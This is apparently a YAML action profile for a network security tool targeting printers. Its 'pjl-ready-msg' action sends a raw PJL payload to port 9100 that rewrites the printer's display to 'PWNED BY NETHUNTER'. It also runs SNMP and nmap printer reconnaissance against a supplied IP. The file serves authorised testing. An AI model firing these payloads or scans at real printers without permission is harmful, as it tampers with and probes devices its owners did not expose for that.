id: printer
device_type: printer
vendor: Generic
family: printer
requires: {}
actions:
  - id: pjl-ready-msg
    label: "Change printer LCD display (PJL)"
    category: exploit_control
    dangerous: true
    confirm_prompt: "This changes the physical LCD message on the printer. Continue?"
    steps:
      - note: "PJL RDYMSG stays until printer power cycle or new print job"
      - tcp_send:
          host: "{{target.ip}}"
          port: 9100
          payload_hex: "1b252d31323334355804 40 50 4a 4c 20 52 44 59 4d 53 47 20 44 49 53 50 4c 41 59 20 3d 20 22 50 57 4e 45 44 20 42 59 20 4e 45 54 48 55 4e 54 45 52 22 0a 1b 25 2d 31 32 33 34 35 58"
          read: 0
          timeout: 4

  - id: snmp-info
    label: "SNMP device info"
    category: recon
    dangerous: false
    steps:
      - run_tool:
          tool: snmpget
          args: ["-v", "1", "-c", "public",
                 "{{target.ip}}", "1.3.6.1.2.1.25.3.2.1.3.1"]
          timeout: 8

  - id: nmap-scripts
    label: "Nmap printer NSE scan"
    category: recon
    dangerous: false
    steps:
      - run_tool:
          tool: nmap
          args: ["-p", "9100,631,515,161",
                 "--script", "pjl-ready-message,printer-info,snmp-info",
                 "{{target.ip}}"]
          timeout: 60
